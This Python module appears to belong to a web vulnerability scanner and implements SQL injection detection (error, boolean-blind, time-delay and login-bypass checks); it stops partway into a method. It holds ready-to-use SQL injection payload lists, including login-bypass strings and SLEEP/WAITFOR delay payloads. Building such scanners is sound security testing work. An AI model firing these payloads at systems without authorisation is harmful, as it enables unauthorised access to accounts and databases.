"""
SQL Injection Scanner
Detects error-based, boolean-based, time-based, and authentication-bypass SQL injection.
"""
import asyncio
import re
import time
from difflib import SequenceMatcher
from typing import TYPE_CHECKING
from urllib.parse import urlparse

from wscan.injection_point import InjectionPoint

from wscan.scanner_contract import (
    CapabilityState, Carrier, CarrierCapability, CostClass, ExecutionKind,
    PayloadShape, Prerequisite, ScannerContract, StateChangeClass, TransportKind,
    ValueKind,
)

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

# SQL error message patterns for various databases
SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning:.*mysql",
    r"unclosed quotation mark after the character string",
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"supplied argument is not a valid mysql",
    r"mysql server version for the right syntax",
    # PostgreSQL
    r"ERROR:\s+syntax error at or near",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"PostgreSQL.*ERROR",
    # MSSQL
    r"unclosed quotation mark",
    r"microsoft OLE DB Provider for SQL Server",
    r"microsoft SQL Native Client error",
    r"incorrect syntax near",
    r"SQLSTATE\[42000\]",
    # Oracle
    r"ORA-\d{4,5}:",
    r"Oracle error",
    r"oracle.*driver",
    # SQLite
    r"SQLite3::query\(\)",
    r"unrecognized token",
    r"SQLite.*error",
    # Generic
    r"syntax error.*sql",
    r"sql.*syntax error",
    r"database.*error",
    r"odbc.*error",
    r"db2.*error",
]

# Time-based payloads that should cause a delay
TIME_BASED_PAYLOADS = [
    "1' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "1' AND BENCHMARK(3000000,MD5('a'))--",
    "1) AND SLEEP(3)--",
]

# 時間ベース blind SQLi の遅延ディレクティブ。進化wave や community 由来の
# 任意のクォート方言（`' OR SLEEP(3)-- -` 等）でも時間判定を走らせるため、
# 固定リストに加えてディレクティブの有無でも判定する。
_TIME_BASED_SQL_RE = re.compile(
    r"\b(?:SLEEP|PG_SLEEP|BENCHMARK|DBMS_PIPE\.RECEIVE_MESSAGE)\s*\(|\bWAITFOR\s+DELAY\b",
    re.IGNORECASE,
)


def _is_time_based_sql(payload: str) -> bool:
    """ペイロードに時間遅延ディレクティブが含まれるか（純粋関数）。"""
    return bool(payload and _TIME_BASED_SQL_RE.search(payload))

# Boolean-based pairs: (true_payload, false_payload)
# A significant response difference between true/false conditions indicates boolean-based SQLi.
BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1) AND (1=1", "1) AND (1=2"),
]

# 共有レイアウトで false の絶対類似度が高止まりしても、true との乖離を捉える。
_BOOLEAN_SIM_GAP = 0.05


def _boolean_blind_divergence(
    baseline_len: int,
    baseline_variance: float,
    true_len: int,
    false_len: int,
    sim_true_base: float,
    sim_false_base: float,
    baseline_status: int | None = None,
    true_status: int | None = None,
    false_status: int | None = None,
) -> bool:
    """長さ・自然変動の既存ガードを保ち、真偽の類似度差も許容する純粋判定。"""
    diff_true = abs(true_len - baseline_len)
    diff_false = abs(false_len - baseline_len)
    return (
        baseline_len > 0
        and diff_false > max(200, baseline_variance * 4)
        and diff_true < diff_false * 0.5
        and sim_true_base >= 0.85
        and (
            sim_false_base <= 0.80
            or (
                sim_true_base - sim_false_base >= _BOOLEAN_SIM_GAP
                # Redirect/challenge bodies cannot establish SQL-driven divergence.
                and all(isinstance(status, int) and 200 <= status < 300
                        for status in (baseline_status, true_status, false_status))
            )
        )
    )


def _pair_status(pair: dict) -> int | None:
    """通信記録の判定用 status。redirect を追従した応答は最初の hop の status を返す。"""
    response = (pair or {}).get("response", {})
    return response.get("redirect_status", response.get("status"))


def classify_sqli_response(
    *,
    status: int | None,
    final_url: str = "",
    body: str = "",
    target_url: str = "",
    login_url: str = "",
    logged_in_marker: str = "",
    has_sql_error: bool = False,
) -> str | None:
    """SQLi 検査時のレスポンスが失効・遮断・未実行（indeterminate）か判定する（純粋関数）。

    401/403/429/5xx やログイン画面へのリダイレクトなど、攻撃が正常にバックエンドへ
    送達・実行されなかった応答を分類する。正常に評価可能な応答なら None を返す。
    ログインフォーム自身の検査（pre-auth）は失効とみなさない。
    """
    from wscan import auth_detect, session_guard

    # 1. 検査対象自身がログイン画面なら pre-auth 検査として正常評価
    if target_url:
        is_preauth_login = False
        if login_url and auth_detect.on_login_page(target_url, login_url):
            is_preauth_login = True
        elif auth_detect.url_looks_like_login(target_url):
            is_preauth_login = True
        if is_preauth_login:
            return None

    # 2. 真正の SQL エラーがある場合は脆弱性応答（500 エラーでも検出優先）
    if has_sql_error:
        return None

    # 3. session_guard によるセッション失効判定
    try:
        if session_guard.looks_logged_out(
            status=status,
            final_url=final_url,
            body=body,
            login_url=login_url,
            logged_in_marker=logged_in_marker,
        ):
            if status in getattr(session_guard, "_UNAUTHORIZED_STATUSES", {401}):
                return "401"
            if auth_detect.has_login_form(body) and (
                (login_url and auth_detect.on_login_page(final_url, login_url))
                or auth_detect.url_looks_like_login(final_url)
            ):
                return "login_redirect"
            if logged_in_marker and (logged_in_marker not in (body or "")) and auth_detect.has_login_form(body):
                return "login_marker_lost"
            return "logged_out"
    except Exception:
        pass

    # 4. ログイン画面への着地（target_url と異なる URL かつログイン画面）
    if final_url:
        is_login = False
        if login_url and auth_detect.on_login_page(final_url, login_url):
            is_login = True
        elif auth_detect.url_looks_like_login(final_url):
            is_login = True
        if is_login and (not target_url or final_url != target_url):
            return "login_redirect"

    # 5. ステータスコード判定
    if status == 401:
        return "401"
    if status == 403:
        return "403"
    if status == 429:
        return "429"
    if status is not None and 500 <= status <= 599:
        return f"{status}" if status in (500, 502, 503, 504) else "5xx"

    return None


# ── Auth bypass detection ──────────────────────────────────────────────────

# Payloads that are specifically useful for SQL injection authentication bypass.
# These are always tested against fields that look like username/password fields.
AUTH_BYPASS_PAYLOADS = (
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    ") OR ('1'='1",
    ") OR 1=1--",
    "1 OR 1=1",
    "1 OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "' OR ''='",
    "1' OR '1'='1",
)
AUTH_BYPASS_PAYLOAD_SET = frozenset(AUTH_BYPASS_PAYLOADS)

# Field name substrings that indicate a login/authentication field.
_LOGIN_FIELD_KEYWORDS = frozenset([
    "user", "login", "email", "mail", "account", "uname",
    "pass", "pwd", "passwd", "password", "secret", "credential",
])

# Patterns in page source that suggest the login FAILED (not bypassed).
#
# These are used as a *negative* filter: when any pattern matches we conclude
# auth-bypass did NOT occur.  They must therefore be tight — broad patterns
# that match normal admin/dashboard copy (e.g. "please contact ...", "error log",
# generic phrases like "try again") would cause real bypasses to be missed.
#
# All patterns are evaluated with re.IGNORECASE | re.DOTALL by
# check_response_for_patterns(), so we keep distances between alternatives
# explicit and short.
LOGIN_FAILED_PATTERNS = [
    r"invalid\s+(user(name)?|pass(word)?|credential|login|email|account)",
    r"(user(name)?|pass(word)?|login|credential|email|account)\s+(is\s+)?(incorrect|wrong|invalid)",
    r"authentication\s+(failed|error|denied|invalid)",
    r"login\s+(failed|incorrect|denied|invalid|unsuccessful)",
    r"incorrect\s+(user(name)?|pass(word)?|credential|login)",
    r"wrong\s+(user(name)?|pass(word)?|credential|login)",
    r"(access|login|sign.?in)\s+denied",
    r"bad\s+(user(name)?|credential|login|pass(word)?)",
    r"(user|account|email)\s+(not\s+found|does\s+not\s+exist|unknown|unrecognized)",
    r"please\s+(re[-\s]?enter|try\s+again|check)(\s+your)?\s+(user(name)?|pass(word)?|credential|login|email)",
]

# Path segments that indicate the browser is still on an auth/error page after submit.
_AUTH_PAGE_KEYWORDS = (
    "/login", "/signin", "/sign-in", "/logon",
    "/auth", "/authenticate",
    "/error", "/403", "/401", "/access-denied",
)

# Route markers that indicate an authenticated / protected area.
_AUTH_ROUTE_MARKERS = (
    "/admin", "/dashboard", "/account", "/profile", "/console",
    "/portal", "/member", "/settings", "/mypage", "/internal", "/private",
)

# Visible / DOM text indicators that suggest an authenticated session.
_AUTH_CONTENT_INDICATORS = (
    "logout", "sign out", "log out", "ログアウト", "マイページ",
    "dashboard", "admin panel", "welcome,", "welcome back",
    "user-menu", "account-settings", "secret account data",
)

# Route markers that explicitly indicate an unauthenticated / public area.
_UNAUTH_ROUTE_MARKERS = (
    "/public", "/guest", "/unauthenticated", "/anonymous",
)

# Text patterns indicating explicit unauthenticated / public landing.
_UNAUTH_CONTENT_PATTERNS = [
    r"welcome\s+to\s+our\s+public\s+page",
    r"nothing\s+secret\s+here",
    r"general\s+information\s+for\s+all\s+visitors",
    r"public\s+information",
    r"guest\s+user",
    r"not\s+logged\s+in",
]


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner."""

    CHECK_TYPE = "sqli"
    CONTRACT = ScannerContract(
        execution_kinds=frozenset({ExecutionKind.FIELD_INJECTION}),
        capabilities=(
            CarrierCapability(
                carrier=Carrier.QUERY, state=CapabilityState.SUPPORTED,
                value_kinds=frozenset({ValueKind.STRING}),
                transports=frozenset({TransportKind.PLAYWRIGHT}),
                browser_required=True,
                payload_shapes=frozenset({PayloadShape.SCALAR}),
            ),
            CarrierCapability(
                carrier=Carrier.FORM, state=CapabilityState.SUPPORTED,
                value_kinds=frozenset({ValueKind.STRING}),
                transports=frozenset({TransportKind.PLAYWRIGHT}),
                browser_required=True,
                payload_shapes=frozenset({PayloadShape.SCALAR}),
            ),
            CarrierCapability(
                carrier=Carrier.JSON, state=CapabilityState.SUPPORTED,
                value_kinds=frozenset({ValueKind.STRING}),
                transports=frozenset({TransportKind.HTTPX}),
                payload_shapes=frozenset({PayloadShape.SCALAR}),
            ),
            CarrierCapability(
                carrier=Carrier.XML, state=CapabilityState.SUPPORTED,
                value_kinds=frozenset({ValueKind.STRING}),
                transports=frozenset({TransportKind.HTTPX}),
                payload_shapes=frozenset({PayloadShape.SCALAR}),
            ),
            CarrierCapability(
                carrier=Carrier.MULTIPART, state=CapabilityState.PLANNED,
                reason="carrier 別 dispatcher は未接続",
                task="0035-D",
            ),
            CarrierCapability(
                carrier=Carrier.HEADER, state=CapabilityState.PLANNED,
                reason="carrier 別 dispatcher は未接続",
                task="0035-D",
            ),
            CarrierCapability(
                carrier=Carrier.COOKIE, state=CapabilityState.PLANNED,
                reason="carrier 別 dispatcher は未接続",
                task="0035-D",
            ),
            CarrierCapability(
                carrier=Carrier.PATH, state=CapabilityState.PLANNED,
                reason="carrier 別 dispatcher は未接続",
                task="0035-D",
            ),
            CarrierCapability(
                carrier=Carrier.GRAPHQL, state=CapabilityState.PLANNED,
                reason="carrier 別 dispatcher は未接続",
                task="0035-D",
            ),
            CarrierCapability(
                carrier=Carrier.WEBSOCKET, state=CapabilityState.PLANNED,
                reason="carrier 別 dispatcher は未接続",
                task="0035-D",
            ),
        ),
    )

    SEVERITY = "critical"
    SUPPORTS_JSON_BODY = True
    SUPPORTS_XML_BODY = True

    # ------------------------------------------------------------------
    # Auth-bypass helpers
    # ------------------------------------------------------------------

    def _is_login_field(self, field_name: str) -> bool:
        """Return True if the field name suggests a username or password input."""
        n = field_name.lower()
        return any(kw in n for kw in _LOGIN_FIELD_KEYWORDS)

    def _prioritize_login_payloads(self, field_name: str, payloads: list[str]) -> list[str]:
        """
        Keep auth-bypass payloads inside small max-payload scans.

        Without this, --max-payloads can spend the entire SQLi budget on generic
        syntax probes and never test the payloads that matter for login forms.
        """
        if not self._is_login_field(field_name):
            return payloads
        merged = list(AUTH_BYPASS_PAYLOADS)
        merged.extend(p for p in payloads if p not in AUTH_BYPASS_PAYLOAD_SET)
        cap = getattr(self.engine, "max_payloads", 0)
        return merged[:cap] if cap and cap > 0 else merged

    def _detect_auth_bypass(
        self,
        original_url: str,
        source: str,
        pair: dict | None = None,
    ) -> tuple[bool, str]:
        """
        Check whether the browser was redirected to an authenticated area after
        the payload was submitted.

        Returns (bypassed: bool, post_url: str).
        """
        try:
            post_url = self.browser.page.url
        except Exception:
            return False, ""

        # 1. Probe delivery truth: if probe was explicitly not delivered, reject
        if getattr(self.browser, "last_probe_delivered", True) is False:
            return False, post_url

        # 2. HTTP status truth: inspect pair or browser.last_pair / network.latest()
        effective_pair = pair if pair is not None else getattr(self.browser, "last_pair", None)
        if effective_pair is None and hasattr(getattr(self, "browser", None), "network"):
            network = getattr(self.browser, "network", None)
            if hasattr(network, "latest"):
                try:
                    effective_pair = network.latest()
                except Exception:
                    pass

        status = None
        if effective_pair is not None:
            status = _pair_status(effective_pair)
            if status is None and isinstance(effective_pair, dict):
                resp = effective_pair.get("response", {})
                if isinstance(resp, dict):
                    status = resp.get("status")
                if status is None:
                    status = effective_pair.get("status_code") or effective_pair.get("status")

        status_int = None
        if status is not None:
            try:
                status_int = int(status)
                if status_int < 200 or status_int >= 400:
                    return False, post_url
            except (ValueError, TypeError):
                pass

        # 3. URL must differ from where the form was submitted
        if post_url.rstrip("/") == original_url.rstrip("/"):
            return False, post_url

        # Destination must not be another login / error page
        post_lower = post_url.lower()
        if any(kw in post_lower for kw in _AUTH_PAGE_KEYWORDS):
            return False, post_url

        # Response must not contain typical login-failure messages
        if self.check_response_for_patterns(source, LOGIN_FAILED_PATTERNS):
            return False, post_url

        # Minimal content check — blank pages are not a successful bypass
        if len(source.strip()) < 50:
            return False, post_url

        # 4. Positive authenticated landing evidence
        parsed_path = urlparse(post_url).path.lower()

        # Explicit unauthenticated route segment rejection
        if any(
            marker == parsed_path or parsed_path.startswith(f"{marker}/") or f"/{marker.strip('/')}/" in f"/{parsed_path.strip('/')}/"
            for marker in _UNAUTH_ROUTE_MARKERS
        ):
            return False, post_url

        # Explicit unauthenticated content pattern rejection
        if self.check_response_for_patterns(source, _UNAUTH_CONTENT_PATTERNS):
            return False, post_url

        # Positive route indicators
        has_auth_route = any(marker in parsed_path for marker in _AUTH_ROUTE_MARKERS)

        # Positive content / DOM indicators
        source_lower = source.lower()
        has_auth_content = any(ind in source_lower for ind in _AUTH_CONTENT_INDICATORS)

        # Configured login success indicator / login assessment check
        has_assess_success = False
        login_indicator = getattr(getattr(self, "engine", None), "login_success_indicator", "") or ""
        if login_indicator and (login_indicator in post_url or login_indicator in source):
            has_assess_success = True
        else:
            try:
                from wscan.login_surface import assess_login_state, LoginObservation, SUCCESS
                obs = LoginObservation(
                    post_url=post_url,
                    body=source,
                    status=status_int if status_int is not None else 200,
                    success_indicator=login_indicator,
                )
                assessment = assess_login_state(obs)
                if assessment.state == SUCCESS:
                    has_assess_success = True
            except Exception:
                pass

        if not (has_auth_route or has_auth_content or has_assess_success):
            return False, post_url

        return True, post_url

    def _current_page_url(self, default: str = "") -> str:
        browser = getattr(self, "browser", None)
        page = getattr(browser, "page", None) if browser else None
        return getattr(page, "url", "") or default

    def _get_engine_auth_markers(self) -> tuple[str, str]:
        engine = getattr(self, "engine", None)
        login_url = getattr(engine, "login_url", "") if engine else ""
        logged_in_marker = getattr(engine, "logged_in_marker", "") if engine else ""
        return login_url, logged_in_marker

    def _mark_api_auth_failed(self, value: bool) -> None:
        engine = getattr(self, "engine", None)
        if engine is not None:
            try:
                engine._api_auth_failed = value
            except Exception:
                pass

    async def scan_injection_point(
        self,
        ip: InjectionPoint,
        field: dict,
    ) -> list[Finding]:
        """Scan a form field or URL parameter for SQL injection."""
        findings = []
        field_name = ip.display_name or ip.parameter_id
        payloads = await self.get_payloads(field_name, ip.url, ip=ip)
        payloads = self._prioritize_login_payloads(field_name, payloads)

        if self.monitor:
            await self.monitor.emit_status(
                f"SQLi testing: {field_name} on {ip.url}"
            )

        # Get baseline response for comparison (content + timing)
        baseline_source, baseline_pair = await self._get_baseline(ip)
        baseline_len = len(baseline_source)
        baseline_lower = (baseline_source or "").lower()

        login_url, logged_in_marker = self._get_engine_auth_markers()
        current_url = self._current_page_url(ip.url)

        # baseline の失効/遮断判定（401/403/429/5xx/ログイン画面リダイレクト）
        base_status = _pair_status(baseline_pair)
        base_has_sql = bool(self.check_response_for_patterns(baseline_source, SQL_ERROR_PATTERNS))
        base_reason = classify_sqli_response(
            status=base_status,
            final_url=current_url,
            body=baseline_source,
            target_url=ip.url,
            login_url=login_url,
            logged_in_marker=logged_in_marker,
            has_sql_error=base_has_sql,
        )
        if base_reason:
            self._record_scan_note(f"auth_lost:{self.CHECK_TYPE}:{base_reason}")
            self._mark_api_auth_failed(True)
            return []

        # Second baseline to measure natural response length variance
        # (dynamic content like ads/timestamps can shift length by hundreds of bytes)
        baseline_source2, baseline_pair2 = await self._get_baseline(ip)
        current_url2 = self._current_page_url(ip.url)
        base_status2 = _pair_status(baseline_pair2)
        base_has_sql2 = bool(self.check_response_for_patterns(baseline_source2, SQL_ERROR_PATTERNS))
        base_reason2 = classify_sqli_response(
            status=base_status2,
            final_url=current_url2,
            body=baseline_source2,
            target_url=ip.url,
            login_url=login_url,
            logged_in_marker=logged_in_marker,
            has_sql_error=base_has_sql2,
        )
        if base_reason2:
            self._record_scan_note(f"auth_lost:{self.CHECK_TYPE}:{base_reason2}")
            self._mark_api_auth_failed(True)
            return []

        baseline_ids = tuple(self._probe_id(p) for p in (baseline_pair, baseline_pair2))
        baseline_variance = abs(len(baseline_source) - len(baseline_source2))

        # Measure baseline response time for dynamic time-based threshold
        _b_req = baseline_pair.get("request", {})
        _b_resp = baseline_pair.get("response", {})
        _b_ts_req = _b_req.get("timestamp", 0)
        _b_ts_resp = _b_resp.get("timestamp", 0)
        baseline_time = (
            float(_b_ts_resp - _b_ts_req)
            if _b_ts_req and _b_ts_resp
            else 0.0
        )
        # Threshold = baseline + 2.5 s (the injected sleep) with 0.5 s margin
        time_threshold = max(2.5, baseline_time + 2.5)

        auth_lost = [False]

        async def _test_payload(payload: str, check_label: str = "sqli") -> bool:
            await self.log_payload_test(field_name, payload, check_label, ip.url)

            # Apply payload
            wave = {"sqli": "standard", "sqli_evolved": "evolution", "sqli_mutation": "mutation"}.get(check_label, "auxiliary")
            source, pair = await self._apply_ip(
                ip, payload, baseline_attempt_ids=baseline_ids, probe_wave=wave)
            control_ids = ()

            # 攻撃応答の失効・遮断を判定（401/403/429/5xx/ログイン画面リダイレクト）
            current_url = self._current_page_url(ip.url)
            resp_status = _pair_status(pair)
            match = self.check_response_for_patterns(source, SQL_ERROR_PATTERNS)
            if match and match.lower() in baseline_lower:
                match = None

            reason = classify_sqli_response(
                status=resp_status,
                final_url=current_url,
                body=source,
                target_url=ip.url,
                login_url=login_url,
                logged_in_marker=logged_in_marker,
                has_sql_error=bool(match),
            )
            if reason:
                self._record_scan_note(f"auth_lost:{self.CHECK_TYPE}:{reason}")
                self._mark_api_auth_failed(True)
                self._probe_decision(
                    pair, False, "sqli_payload_oracle",
                    baseline_attempt_ids=baseline_ids, control_attempt_ids=control_ids,
                    outcome="indeterminate",
                    rationale=f"response indeterminate ({reason})",
                )
                auth_lost[0] = True
                return False

            # --- Check 1: Error-based SQLi ---
            # baseline に既に同じエラー文字列が出ているなら、それはページ本来の
            # 文言（"database error" 等の通常コピー）であって注入結果ではない。
            # ペイロード投入で「新たに」現れたエラーだけを陽性とする（誤検知抑制）。
            if match:
                self._probe_decision(pair, True, "sqli_payload_oracle",
                                     baseline_attempt_ids=baseline_ids, control_attempt_ids=control_ids,
                                     rationale="new SQL error absent from measured baseline")
                finding = await self.record_finding(
                    url=ip.url,
                    field_name=field_name,
                    payload=payload,
                    evidence=f"SQL error message detected: '{match}'",
                    pair=pair,
                    severity="critical",
                    confidence="confirmed",
                    evidence_type="sqli_error",
                    evidence_details={
                        "matched_error": match,
                        "baseline_length": baseline_len,
                        "attack_length": len(source),
                    },
                    reproduction_steps=[
                        f"Open {ip.url}",
                        f"Submit the payload to '{field_name}'",
                        "Confirm that the response contains a database error message.",
                    ],
                    injection_point=ip,
                )
                findings.append(finding)
                return True

            # --- Check 2: Boolean-based blind SQLi ---
            # Compare true vs false condition: if one matches the baseline and the other
            # diverges significantly, it indicates the backend evaluates the expression.
            for true_payload, false_payload in BOOLEAN_PAIRS:
                if payload not in (true_payload, false_payload):
                    continue
                partner = false_payload if payload == true_payload else true_payload
                await self.log_payload_test(
                    field_name, partner, "sqli_boolean_partner", ip.url
                )
                partner_source, partner_pair = await self._apply_ip(
                    ip, partner, probe_role="control", baseline_attempt_ids=baseline_ids,
                    parent_attempt_id=self._probe_id(pair), probe_wave=wave)
                control_ids = (self._probe_id(partner_pair),)
                true_src = source if payload == true_payload else partner_source
                false_src = partner_source if payload == true_payload else source
                true_pair = pair if payload == true_payload else partner_pair
                false_pair = partner_pair if payload == true_payload else pair
                # transport 失敗（json_body の timeout/TLS/DNS/proxy 等）は空応答("")を返す。
                # 空を「false 条件の相違」と誤認して高 severity の偽陽性を出さないよう、
                # どちらかが空なら比較不能としてこの pair をスキップする。
                if not true_src or not false_src:
                    continue
                partner_url = self._current_page_url(ip.url)
                partner_status = _pair_status(partner_pair)
                partner_reason = classify_sqli_response(
                    status=partner_status,
                    final_url=partner_url,
                    body=partner_source,
                    target_url=ip.url,
                    login_url=login_url,
                    logged_in_marker=logged_in_marker,
                )
                if partner_reason:
                    self._record_scan_note(f"auth_lost:{self.CHECK_TYPE}:{partner_reason}")
                    self._mark_api_auth_failed(True)
                    auth_lost[0] = True
                    continue
                sim_true_base = self._body_similarity(true_src, baseline_source)
                sim_false_base = self._body_similarity(false_src, baseline_source)
                # 判定は純粋関数 `_boolean_blind_divergence` に集約（ブラウザ非依存でテスト可能）。
                # True が baseline を追従し、false が有意に（自然変動の4倍以上かつ最低200B）乖離する
                # 非対称性を要求。共有レイアウトで false の全体類似度が高止まりしても、true との相対
                # ギャップで真偽差を捉えて見逃しを防ぐ（絶対類似度 <=0.80 の天井は包含）。
                if _boolean_blind_divergence(
                    baseline_len,
                    baseline_variance,
                    len(true_src),
                    len(false_src),
                    sim_true_base,
                    sim_false_base,
                    _pair_status(baseline_pair),
                    _pair_status(true_pair),
                    _pair_status(false_pair),
                ):
                    self._probe_decision(pair, True, "sqli_payload_oracle",
                                         baseline_attempt_ids=baseline_ids, control_attempt_ids=control_ids,
                                     rationale="boolean response divergence against baseline and partner")
                    finding = await self.record_finding(
                        url=ip.url,
                        field_name=field_name,
                        payload=payload,
                        evidence=(
                            f"Boolean-based blind SQLi: true condition response length "
                            f"{len(true_src)} vs false condition {len(false_src)} "
                            f"(baseline {baseline_len})"
                        ),
                        pair=pair,
                        severity="high",
                        confidence="likely",
                        evidence_type="sqli_boolean",
                        evidence_details={
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "baseline_length": baseline_len,
                            "true_length": len(true_src),
                            "false_length": len(false_src),
                            "baseline_variance": baseline_variance,
                            "similarity_true_to_baseline": round(sim_true_base, 4),
                            "similarity_false_to_baseline": round(sim_false_base, 4),
                        },
                        reproduction_steps=[
                            f"Open {ip.url}",
                            f"Submit true-condition payload to '{field_name}': {true_payload}",
                            f"Submit false-condition payload to '{field_name}': {false_payload}",
                            "Confirm that the true response resembles baseline while the false response differs materially.",
                        ],
                        injection_point=ip,
                    )
                    findings.append(finding)
                    return True

            # --- Check 3: Time-based blind SQLi ---
            # 固定リストに加え、SLEEP/WAITFOR 等のディレクティブを含む任意の
            # ペイロード（進化wave・community 由来の方言）でも遅延判定を行う。
            if payload in TIME_BASED_PAYLOADS or _is_time_based_sql(payload):
                if self.response_time_exceeded(pair, threshold=time_threshold):
                    self._probe_decision(pair, True, "sqli_payload_oracle",
                                         baseline_attempt_ids=baseline_ids, control_attempt_ids=control_ids,
                                     rationale="response delay exceeded measured baseline threshold")
                    finding = await self.record_finding(
                        url=ip.url,
                        field_name=field_name,
                        payload=payload,
                        evidence=f"Time-based blind SQLi: response delayed (>3s)",
                        pair=pair,
                        severity="high",
                        confidence="likely",
                        evidence_type="sqli_time",
                        evidence_details={
                            "baseline_time_seconds": round(baseline_time, 4),
                            "threshold_seconds": round(time_threshold, 4),
                            "payload": payload,
                        },
                        reproduction_steps=[
                            f"Open {ip.url}",
                            f"Submit the time-delay payload to '{field_name}'",
                            "Confirm that response time exceeds the measured baseline threshold.",
                        ],
                        injection_point=ip,
                    )
                    findings.append(finding)
                    return True

            # --- Check 4: Authentication bypass via SQLi ---
            # Only applicable when the field looks like a username/password input
            # and the payload is from the auth-bypass set.
            # **form 限定**にする: `_detect_auth_bypass` はブラウザの現在ページ URL を見るが、
            # json_body は httpx 送信でブラウザは遷移しないため、SPA で無関係な現在 URL を
            # 根拠に critical auth bypass を誤検知し得る（移行前は `not is_url_param`＝form 限定
            # だったのを、location!="url_param" は json も含んでしまうため form へ厳格化）。
            # json の auth bypass はレスポンス pair 由来の判定として PR-b で扱う。
            if (
                ip.location == "form"
                and self._is_login_field(field_name)
                and payload in AUTH_BYPASS_PAYLOAD_SET
            ):
                try:
                    bypassed, post_url = self._detect_auth_bypass(ip.url, source, pair)
                except TypeError:
                    bypassed, post_url = self._detect_auth_bypass(ip.url, source)
                if bypassed:
                    self._probe_decision(pair, True, "sqli_payload_oracle",
                                         baseline_attempt_ids=baseline_ids, control_attempt_ids=control_ids,
                                     rationale="existing authentication-bypass oracle matched")
                    finding = await self.record_finding(
                        url=ip.url,
                        field_name=field_name,
                        payload=payload,
                        evidence=(
                            f"SQL injection authentication bypass: login form at {ip.url!r} "
                            f"bypassed with payload {payload!r} — redirected to {post_url!r}"
                        ),
                        pair=pair,
                        severity="critical",
                        confidence="confirmed",
                        evidence_type="sqli_auth_bypass",
                        evidence_details={
                            "post_login_url": post_url,
                            "original_url": ip.url,
                        },
                        reproduction_steps=[
                            f"Open login form {ip.url}",
                            f"Submit auth-bypass payload to '{field_name}'",
                            f"Confirm the browser is redirected to authenticated page {post_url}",
                        ],
                        injection_point=ip,
                    )
                    findings.append(finding)
                    # Notify the engine so it can re-crawl the authenticated surface
                    if hasattr(self.engine, "signal_auth_bypass"):
                        self.engine.signal_auth_bypass(ip.url, payload, post_url)
                    return True

            self._probe_decision(pair, False, "sqli_payload_oracle",
                                 baseline_attempt_ids=baseline_ids, control_attempt_ids=control_ids,
                                     rationale="no SQL error, boolean, timing or applicable authentication-bypass signal")
            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.2 * self.sleep_factor)
            return False

        for payload in payloads:
            if auth_lost[0]:
                break
            if await _test_payload(payload):
                break  # Found vulnerability, move to next field

        # evolution wave は legacy browser transport 専用なので JSON/XML では実行しない。
        if not findings and not auth_lost[0] and ip.location not in ("json_body", "xml_body"):
            extra_payloads = await self.evolved_payloads(
                ip.url,
                ip.form_index,
                ip.parameter_id,
                ip.legacy_is_url_param(),
                dom_index=ip.submit_index,
            )
            for payload in extra_payloads:
                if auth_lost[0]:
                    break
                if await _test_payload(payload, "sqli_evolved"):
                    break

        # --- Mutation wave: bypass変種 + ギャップで漏れた blind(boolean/time) を確実に投入 ---
        if not findings and not auth_lost[0]:
            mutated = await self.mutated_payloads(field_name, ip.url, payloads, ip=ip)
            for payload in mutated:
                if auth_lost[0]:
                    break
                if await _test_payload(payload, "sqli_mutation"):
                    break

        # --- Check 5: String-concatenation equivalence probe ---
        # When the error/boolean/time checks find nothing, fall back to the
        # filter- and error-independent concatenation-equivalence probe
        # (e.g. AA' 'BB collapsing to AABB), which confirms the quote was
        # interpreted as SQL syntax rather than reflected as data。
        # 等価性 probe も legacy browser transport 専用なので JSON/XML では実行しない。
        if not findings and not auth_lost[0] and ip.location not in ("json_body", "xml_body"):
            probe = await self.run_equivalence_probe(
                ip.url,
                ip.form_index,
                ip.parameter_id,
                ip.legacy_is_url_param(),
                context="sql",
                dom_index=ip.submit_index,
            )
            if probe:
                verdict, pair = probe
                finding = await self.record_finding(
                    url=ip.url,
                    field_name=field_name,
                    payload=verdict.details.get("matched_payload", ""),
                    evidence=(
                        "String-concatenation equivalence SQLi: "
                        + verdict.rationale
                    ),
                    pair=pair,
                    severity="high",
                    confidence="likely" if verdict.confidence >= 0.85 else "tentative",
                    evidence_type="sqli_concat_equivalence",
                    evidence_details={
                        "matched_dialect": verdict.matched_dialect,
                        "matched_probe": verdict.matched_probe,
                        "probe_confidence": round(verdict.confidence, 3),
                        **verdict.details,
                    },
                    reproduction_steps=[
                        f"Open {ip.url}",
                        f"Submit the concatenation payload to '{field_name}': "
                        f"{verdict.details.get('matched_payload', '')}",
                        "Confirm the response contains the concatenated marker, "
                        "proving the injected quote was interpreted as SQL syntax.",
                    ],
                    injection_point=ip,
                )
                if finding:
                    findings.append(finding)

        return findings

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        """従来 API を InjectionPoint 駆動へ接続する互換 wrapper。"""
        name = field.get("name", "unknown")
        ip = (
            InjectionPoint.for_url_param(url, name)
            if is_url_param
            else InjectionPoint.for_form(url, name, form_index)
        )
        return await self.scan_injection_point(ip, field)

    def _normalise_body(self, body: str) -> str:
        text = body or ""
        text = re.sub(r"(?is)<script[^>]*>.*?</script>", "", text)
        text = re.sub(r"(?is)<style[^>]*>.*?</style>", "", text)
        text = re.sub(r"\b\d{10,}\b", "0", text)
        text = re.sub(r"\b[0-9a-f]{8,}\b", "x", text, flags=re.IGNORECASE)
        text = re.sub(r"\s+", " ", text)
        return text.strip()[:20000]

    def _body_similarity(self, a: str, b: str) -> float:
        na = self._normalise_body(a)
        nb = self._normalise_body(b)
        if not na or not nb:
            return 0.0
        return SequenceMatcher(None, na, nb).ratio()

    async def _get_baseline(self, ip: InjectionPoint) -> tuple[str, dict]:
